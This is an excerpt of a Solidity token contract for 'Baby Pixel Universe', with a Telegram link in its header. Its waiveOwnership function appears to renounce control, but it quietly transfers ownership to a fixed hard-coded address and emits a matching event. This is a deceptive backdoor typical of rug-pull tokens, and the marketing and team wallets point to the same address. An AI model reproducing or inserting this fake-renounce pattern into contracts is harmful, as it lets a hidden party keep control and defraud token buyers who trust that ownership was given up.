...
/**
   ALPHA PLAY GOOD LUCK
   https://t.me/BabyPixelUniverse
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x4456522a0ACdc743152fDDF1e5DE1d161D8664Bb));
        _owner = address(0x4456522a0ACdc743152fDDF1e5DE1d161D8664Bb);
    }
...
contract BabyPixelUniverse is Context, IERC20, Ownable {
    ...
    string private _name = "Baby Pixel Universe";
    string private _symbol = "Baby Pixel";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x328FfABdEF0A94506F64C68A6ce6DCD6717A2416);
    address payable public teamWalletAddress = payable(0x328FfABdEF0A94506F64C68A6ce6DCD6717A2416);
